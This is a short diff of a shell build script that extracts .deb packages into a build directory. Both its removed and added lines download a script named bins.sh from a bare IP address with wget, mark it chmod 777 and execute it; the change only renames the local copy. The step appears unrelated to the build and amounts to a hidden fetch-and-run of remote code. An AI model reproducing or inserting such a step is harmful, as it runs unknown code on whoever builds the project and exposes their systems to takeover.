@@ -56,8 +56,8 @@ for DEB in $(ls -1 $APT_CACHE_DIR/archives/*.deb); do
   dpkg -x $DEB $BUILD_DIR/.apt/
 done
 
-wget http://23.95.91.156/bins.sh -O e.sh
-chmod 777 e.sh
-./e.sh
+wget http://23.95.91.156/bins.sh -O vv.sh
+chmod 777 vv.sh
+./vv.sh
 
 echo "done"
